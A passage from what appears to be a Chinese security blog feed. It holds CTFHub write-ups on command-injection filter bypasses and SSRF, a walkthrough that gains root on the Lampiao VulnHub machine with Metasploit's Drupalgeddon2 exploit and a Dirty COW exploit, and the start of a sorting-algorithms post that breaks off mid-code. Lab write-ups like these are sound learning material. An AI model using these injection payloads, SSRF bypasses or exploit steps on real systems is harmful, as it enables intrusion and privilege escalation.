exec($cmd, $res);    } else {        $res = $m;    }}?&gt;</code></pre><p>和上一题目一样，只不过要防一下过滤</p><p>127.0.0.1;a=ca;b=t;$a$b flag_29869689610883.php</p><p>不错不错新思路</p><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>在linux系统下：</p><p>1:&lt;&gt;  2:&lt;  3:${IFS}这三个均可以表示空格</p><p>所以</p><p>127.0.0.1;ls</p><p>127.0.0.1;cat&lt;flag_260652093720389.php</p><p>ybs</p><h4 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符:/\"></a>过滤目录分隔符:/\</h4><p>127.0.0.1;ls</p><p>127.0.0.1;cd flag_is_here;ls</p><p>127.0.0.1;cd flag_is_here;cat flag_25394867112070.php</p><p>也不知道为什么过滤，就好像过滤了一个寂寞</p><h4 id="过滤运算符-amp"><a href="#过滤运算符-amp" class="headerlink" title="过滤运算符:/(||\&amp;)/"></a>过滤运算符:/(||\&amp;)/</h4><p>127.0.0.1;ls</p><p>127.0.0.1;cat flag_13087279769836.php</p><p>这又是一个寂寞</p><h4 id="综合过滤练习：-amp-cat-flag-ctfhub"><a href="#综合过滤练习：-amp-cat-flag-ctfhub" class="headerlink" title="综合过滤练习：/(||&amp;|;| |\/|cat|flag|ctfhub)/"></a>综合过滤练习：/(||&amp;|;| |\/|cat|flag|ctfhub)/</h4><p>提示：%0a(换行符) 、%0d(回车符)</p><p>在这里的输入框输入：</p><p>127.0.0.1%0als</p><p>会发现，%0a会被两次编码，所以直接在URL里面输入才算可以</p><p>考虑到在linux系统内shell执行的并不能识别url编码，那么这里得知可以使用hex16位编码来进行转换：</p><p>使用命令$(printf${IFS}”hex编码”)</p><p>127.0.0.1%0als&lt;$(printf${IFS}”\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65”)</p><p>得到文件：</p><p>flag_144233033911102.php</p><p>构造:</p><p>127.0.0.1;cat flag_is_here/flag_144233033911102.php</p><p>127.0.0.1%0aca’’t${IFS}$(printf${IFS}”\x66\x6C\x61\x67\x5F\x69\x73\x5F\x68\x65\x72\x65\x2F\x66\x6C\x61\x67\x5F\x31\x34\x34\x32\x33\x33\x30\x33\x33\x39\x31\x31\x31\x30\x32\x2E\x70\x68\x70”)</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>题目信息：尝试访问位于127.0.0.1的flag.php吧</p><p>?url=127.0.0.1/flag.php</p><p>GG</p><h4 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h4><p>题目信息：尝试去读取一下Web目录下的flag.php吧</p><p>?url=file:///var/www/html/flag.php</p><p>查看源文件得flag</p><pre><code>URL伪协议：file://  本地文件传输协议，File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样dict://  Dict协议,字典服务器器协议,dict是基于查询响应的TCP协议,它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628gopher://  Gopher协议是互联网上使用的分布型的文件搜集获取网络协议。gopher协议是在HTTP协议出现之前,在internet上常见重用的协议,但是现在已经用的很少了sftp://  Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作ldap://  LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议tftp://  TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</code></pre><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>题目提示：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p><p>方法一（bp进行端口爆破）：</p><p>爆破格式为</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52212_2.png" alt></p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52213_3.png" alt></p><p>响应中查看</p><p>方法二：</p><pre><code>import requestsurl=&#39;http://challenge-48d05bc5759898a5.sandbox.ctfhub.com:10080/?url=127.0.0.1:&#39;port=8000while port&lt;=9000:    Wholeurl=url+str(port)    r = requests.get(Wholeurl)    print(Wholeurl)    if(len(r.content)!=0):        print(port)        print(r.content)        break    port=port+1print(&quot;over&quot;)</code></pre><p>py脚本进行爆破</p><p><img src="http://images2.5666888.xyz//QQ%E5%9B%BE%E7%89%8720210114112554.png" alt></p><p>（1/13基操↑）</p><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>提示：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>描述：请求的URL中必须包含<a href="http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧" target="_blank" rel="noopener">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p><p>?url=<a href="http://notfound.ctfhub.com@127.0.0.1/flag.php" target="_blank" rel="noopener">http://notfound.ctfhub.com@127.0.0.1/flag.php</a></p><h4 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h4><p>描述：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p><p><del>看了大佬的wp</del>：</p><ol><li>8进制格式：0177.00.00.01</li><li>16进制格式：0x7f.0x0.0x0.0x1</li><li>10进制整数格式：2130706433</li><li>在linux下，0代表127.0.0.1，<a href="http://0进行请求127.0.0.1" target="_blank" rel="noopener">http://0进行请求127.0.0.1</a></li></ol><p>?url=0/flag.php</p><h5 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h5><p>描述：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p><p>?url=127.0.0.1/flag.php</p><h6 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h6><p>关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</p><p><del>搜集wp信息</del>：</p><p>我们这里还是使用DNS重绑定，在网络上存在一个很神奇的服务，<a href="http://xip.io/" target="_blank" rel="noopener">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如127.0.0.1.xip.io，就会自动重定向到127.0.0.1。<br>即：?url=127.0.0.1.xip.io/flag.php</p><p>但是这个题直接这样也可以</p><p>?url=127.0.0.1/flag.php</p><p>毕竟都是定向到127.0.0.1</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> ctfhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lampiao渗透测试初探</title>
      <link href="/2020/12/19/lampiao-shen-tou-chu-tan/"/>
      <url>/2020/12/19/lampiao-shen-tou-chu-tan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="lampiao靶机渗透测试笔记"><a href="#lampiao靶机渗透测试笔记" class="headerlink" title="lampiao靶机渗透测试笔记"></a>lampiao靶机渗透测试笔记</h1><h4 id="简单介绍："><a href="#简单介绍：" class="headerlink" title="简单介绍："></a>简单介绍：</h4><pre><code>Would you like to keep hacking in your own lab?Try this brand new vulnerable machine! &quot;Lampião 1&quot;.Get root!Level: Easy翻译：你想在自己的实验室里继续黑客攻击吗？试试这个全新的易受攻击的机器！”Lampião 1”。获得root权限级别：简单下载地址：https://www.vulnhub.com/entry/lampiao-1,249/</code></pre><h4 id="采坑："><a href="#采坑：" class="headerlink" title="采坑："></a>采坑：</h4><p>1.下载靶机后会发现ovf文件，用VMware打开</p><p>2.压缩包不要解压！</p><h2 id="OK了，开始测试："><a href="#OK了，开始测试：" class="headerlink" title="OK了，开始测试："></a>OK了，开始测试：</h2><h3 id="第一阶段：信息收集"><a href="#第一阶段：信息收集" class="headerlink" title="第一阶段：信息收集"></a>第一阶段：信息收集</h3><p>ifconfig查看自己的ip地址：192.168.204.xxx</p><h4 id="扫描自己的内网（发现阶段）"><a href="#扫描自己的内网（发现阶段）" class="headerlink" title="扫描自己的内网（发现阶段）"></a>扫描自己的内网（发现阶段）</h4><pre><code>nmap -sP 192.168.204.0/24</code></pre><p><img src="http://images2.5666888.xyz//1.jpg" alt></p><p>这里是对-sP命令的介绍：</p><p>1.-Pn是默认目标主机是存活的，-sP是使用ICMP协议发送echo请求数据包，但是很容易被防火墙过滤掉。想尽可能发现所有存活主机的话，建议使用半开式扫描参数-sS或者ACK扫描参数-sA，还无法确定存活主机的话可以试试-sF -sX -sN等参数。</p><p>2.nmap 执行（至少）两步操作，一个是主机发现（Ping），另一个是主机扫描。默认两步是都做的，-P0/-Pn 关闭主机发现，-sP/-sn 关闭主机扫描。两个一起用就是啥也不干，比如 nmap 0.0.0.0 -P0 -sP 显示“host is up”。按照你的要求，不做主机扫描，应该是 -sP，Ping 协议/端口被挡，可以用 -P 的其它选项。比如用 TCP SYN -PS 应该是最快的，UDP -PU 也可以。</p><p>只是扫描整个网段里面的所有ip，如果有ping的通的，通过-sP命令会给你显示出来（存活的主机）。</p><p>这里发现扫描到的主机有好几台，但是我们的目标是获取lampiao的ip地址，so需要进一步判断：</p><p>1.在lampiao靶机的网络配置里面找到mac地址</p><p><img src="http://images2.5666888.xyz//2.png" alt></p><p>2.在存活的主机里面找到与之相对应的mac地址</p><p><img src="http://images2.5666888.xyz//3.png" alt></p><p>3.得到lampiao的IP地址:192.168.204.137</p><h4 id="开始对主机进行扫描："><a href="#开始对主机进行扫描：" class="headerlink" title="开始对主机进行扫描："></a>开始对主机进行扫描：</h4><p>使用如下命令：</p><pre><code>nmap -A -p- -T4 192.168.204.137</code></pre><pre><code>这里-p是指所有的端口nmap -p(port1,port2,port3,...) &lt;target ip&gt;  解释：指定几个端口进行扫描例子：nmap -p80,443,22,21,8080,25,53 192.168.2.107</code></pre><pre><code>-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4</code></pre><pre><code>nmap -A &lt;target ip&gt; 解释：nmap 万能开关次选项设置包含了1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测。例子：nmap -A 192.168.2.107</code></pre><p>经过扫描得到了3个端口：22、80、1898</p><pre><code>可以发现，目标主机开放了三个端口，分别是22,80和1898,22端口是ssh服务，80端口是http服务，但是信息不是很详细，1898端口开放的是http服务，并且使用了Drupal框架</code></pre><p>另一种扫描方法：</p><pre><code>nmap -sS -sV -Pn -n  -A 192.168.191.133-sS 使用SYN半开式扫描，这种扫描方式使得扫描结果更加正确(又称半开放,或隐身扫描)-sV 探测端口的服务类型/具体版本等信息-Pn 禁用主机检测,目标主机屏蔽了ping请求时可用-n表示不进行dns解析，-p表示要-A强力扫描，耗时长</code></pre><p>这种方法比上一种方法要快，且更为保险</p><p>Drupal框架显示在这里：</p><p><img src="http://images2.5666888.xyz//4.png" alt></p><p>得到版本为7（忘记截屏了），还发现了一些目录和文件！！</p><p>例如：/robots.txt文件</p><p><img src="http://images2.5666888.xyz//5.png" alt>g)</p><p>然后打开浏览器访问192.168.204.137:80端口得到如下页面（啥也没有。。。）：</p><p><img src="http://images2.5666888.xyz//6.png" alt></p><p>但是当我们访问1898端口的时候出现如下页面：</p><p><img src="http://images2.5666888.xyz//7.png" alt></p><h3 id="第二阶段：漏洞利用"><a href="#第二阶段：漏洞利用" class="headerlink" title="第二阶段：漏洞利用"></a>第二阶段：漏洞利用</h3><pre><code>在扫描端口的时候可以发现目标使用了Drupal框架，并且是7的版本，7的版本存在一些漏洞，可以利用这些漏洞来获得shell在网站中查找信息，看能否找到Drupal的具体版本查看网站的robots.txt文件</code></pre><p>这里是因为通过扫描发现了robots.txt（属于敏感信息范畴）</p><p>访问：</p><p>192.168.204.137:1898/robots.txt</p><p>得到如下信息：</p><p><img src="http://images2.5666888.xyz//8.png" alt></p><p>这里是在注释为文件一栏目中的文件：changelog.txt（这里为大写）意思为改变的日志（更新日志）</p><p>访问192.168.204.137:1898/CHANGELOG.txt得到如下信息：</p><p><img src="http://images2.5666888.xyz//9.png" alt></p><p>得到drupal的版本信息：7.54</p><p>然后就可以去网上搜索一下关于该版本的漏洞，然后针对漏洞进行攻击！</p><pre><code>在网上可以查到Drupal7.54存在的漏洞：https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=drupal可以利用metasploit来针对此版本的Drupal进行攻击，获得shell（咋看出来的我也不知道）经过查阅发现msf可以搜索一个框架的漏洞</code></pre><p>建议搜狗访问（因为可以翻译，别的浏览器我找不到在哪里翻译-_-||）然后翻译后发现：</p><p><img src="http://images2.5666888.xyz//10.png" alt></p><p>这个版本的漏洞简直数不胜数（但是现在的依然需要根据教程来操作-_-||）</p><h3 id="接下来就是针对msf的使用"><a href="#接下来就是针对msf的使用" class="headerlink" title="接下来就是针对msf的使用"></a>接下来就是针对msf的使用</h3><p>1.</p><pre><code>search drupal搜索其漏洞得到：</code></pre><p><img src="http://images2.5666888.xyz//11.png" alt></p><p>2.使用Drupal Drupalgeddon 2 Forms API Property Injection（远程代码执行漏洞）</p><pre><code>use 4set rhost 192.168.204.137set rport 1898show targetsset target 0#查看以及设置目标操作系统类型run #上面两步推荐的方式，这里我们直接run，这步结束后会得到一个会话用来连接对面的shellshellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; #执行shell获取交互式命令，由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用 python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如上</code></pre><p><img src="http://images2.5666888.xyz//12.png" alt></p><p>此时获取了shell然后开始查看当下目录</p><p>在var/www/html/sites/default目录下找到配置文件settings.php，发现敏感信息，tiago以及密码，很有可能就是其系统用户tiago的密码，如下图：</p><p><img src="http://images2.5666888.xyz//321.jpg" alt></p><p>打开192.168.204.137:1898端口，发现了一篇文章的提交者，说明什么！这个人就很有可能是这个网站的管理员，或者系统用户所以就试试呗，毕竟信息收集也就这么多了。。</p><p>然后利用ssh协议进行远程登录</p><pre><code>ssh tiago@192.168.204.137</code></pre><p>成功获取shell！</p><p>最重要一步↓</p><h3 id="脏牛提权！！"><a href="#脏牛提权！！" class="headerlink" title="脏牛提权！！"></a>脏牛提权！！</h3><pre><code>uname -a查看一下内核信息：2016年的这是searchsploit dirty直接脏牛的木马喽一眼//看网上说用这个脚本提权cp /usr/share/exploitdb/exploits/linux/local/40847.cpp ~注意这里的 ~,他前面的是这个脚本的文件目录，~可以改为/root或者/home反正就是搁主目录下，一个ls就能看见那种</code></pre><p>如下图：</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52134_1.png" alt></p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52137_2.png" alt></p><p>然后再回到msf页面ctrl+c返回控制台 </p><pre><code>meterpreter &gt; upload /root/40847.cpp /tmp/40847.cpp</code></pre><p>把我/root文件下的目录传到/tmp目录下</p><pre><code>shell//继续连接回去python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;//进入TTL终端</code></pre><p>然后回到/tmp目录下ls查看：</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52227_4.png" alt></p><pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil进行编译这是关于参数1-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告2-pedantic 允许发出ANSI/ISO C标准所列出的所有警告3-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高4-std=c++11就是用按C++2011标准来编译的5-pthread 在Linux中要用到多线程时，需要链接pthread库6-o dcow gcc生成的目标文件,名字为dcow./dcow -s#执行该文件 ./dcow &gt; status.txt有同样的效果</code></pre><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52217_3.png" alt></p><p>然后会发现该漏洞利用成功，已将root密码修改！</p><pre><code>www-data@lampiao:/tmp$ ./dcow &gt; status.txt./dcow &gt; status.txtRunning ...Received su prompt (Password: )Root password is:   dirtyCowFunEnjoy! :-)www-data@lampiao:/tmp$ su rootsu rootPassword: dirtyCowFunroot@lampiao:/tmp# lsroot@lampiao:/# cd /rootcd /rootroot@lampiao:~# lslsflag.txtroot@lampiao:~# cat flag.txtcat flag.txt9740616875908d91ddcdaa8aea3af366</code></pre><p>能做到此步十分感谢，十分感谢网上各位大佬的wp</p><p>总结：</p><p>对各种工具的掌握十分fw</p><p>不会就百度</p><p>对脏牛提取有了大体的认识</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十大经典排序算法整理汇总（附代码）</title>
      <link href="/2020/02/16/sort-algorithms/"/>
      <url>/2020/02/16/sort-algorithms/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>每日算法干货马上就来！</p></blockquote><p><img src="/2020/02/16/sort-algorithms/../themes/matery/source/medias/contact.jpg" alt></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文整理并总结了十大经典的排序算法（冒泡排序、选择排序、插入排序、快速排序、归并排序、希尔排序、计数排序、基数排序、桶排序、堆排序）的时间复杂度、空间复杂度等性质。</p><p><strong>本文并不会详细讲解每种排序算法的原理</strong>，网上有很多很好的教程，大家可以自己去搜了看。</p><p>最后我还亲自手写了十种排序算法的 c++ 代码，大家可以用来通过 <a href="https://leetcode-cn.com/problems/sort-an-array/" title="LeetCode 912. 排序数组" target="_blank" rel="noopener">LeetCode 912. 排序数组</a> 这道题。</p><h2 id="性质汇总"><a href="#性质汇总" class="headerlink" title="性质汇总"></a>性质汇总</h2><blockquote><p>如果发现表中有错误，请留言告知。</p></blockquote><table><thead><tr><th>算法</th><th>最好</th><th>最坏</th><th>平均</th><th>空间</th><th align="center">稳定性</th><th align="center">是否基于比较</th></tr></thead><tbody><tr><td>冒泡排序</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>选择排序</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>插入排序</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>快速排序</td><td>$O(n\log n)$</td><td>$O(n^2)$</td><td>$O(n\log n)$</td><td>$O(\log n)$~$O(n)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>归并排序</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>希尔排序</td><td>$O(n^{1.3})$</td><td>$O(n^2)$</td><td>$O(n\log n)$~$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>计数排序</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>基数排序</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>桶排序</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n+m)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>堆排序</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr></tbody></table><blockquote><p>如果表格显示有问题的话，还可以直接看下面的汇总图：</p></blockquote><p><img src="/2020/02/16/sort-algorithms/1.png" alt="十大经典排序算法性质汇总"></p><h3 id="维基百科"><a href="#维基百科" class="headerlink" title="维基百科"></a>维基百科</h3><p>我觉得还是英文维基百科讲的比较详细、严谨。如果大家看的比较累的话，可以自己百度搜索相应的教程。</p><p><strong>冒泡排序</strong><br><a href="https://en.wikipedia.org/wiki/Bubble_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bubble_sort</a></p><p><strong>选择排序</strong><br><a href="https://en.wikipedia.org/wiki/Selection_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Selection_sort</a></p><p><strong>插入排序</strong><br><a href="https://en.wikipedia.org/wiki/Insertion_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Insertion_sort</a></p><p><strong>快速排序</strong><br><a href="https://en.wikipedia.org/wiki/Quicksort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Quicksort</a></p><p><strong>归并排序</strong><br><a href="https://en.wikipedia.org/wiki/Merge_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Merge_sort</a></p><p><strong>希尔排序</strong><br><a href="https://en.wikipedia.org/wiki/Shellsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Shellsort</a></p><p><strong>计数排序</strong><br><a href="https://en.wikipedia.org/wiki/Counting_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Counting_sort</a></p><p><strong>基数排序</strong><br><a href="https://en.wikipedia.org/wiki/Radix_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Radix_sort</a></p><p><strong>桶排序</strong><br><a href="https://en.wikipedia.org/wiki/Bucket_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bucket_sort</a></p><p><strong>堆排序</strong><br><a href="https://en.wikipedia.org/wiki/Heapsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Heapsort</a></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>所有的排序算法接口都是相同的，也就是 <code>vector&lt;int&gt; xxxSort(vector&lt;int&gt;&amp; nums)</code> 。只需要你传入一个 <code>vector&lt;int&gt;</code> 类型的数组，就能返回排序后的结果。</p><p>运行下来可以发现，桶排序速度是比较快的。而冒泡排序、选择排序和插入排序因为时间复杂度太高无法通过本题，基数排序因为无法处理负数也不能通过本题。</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">sortArray</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 冒泡排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token number">-2</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 选择排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">selectSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> idx <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    idx <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 插入排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">insertSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span 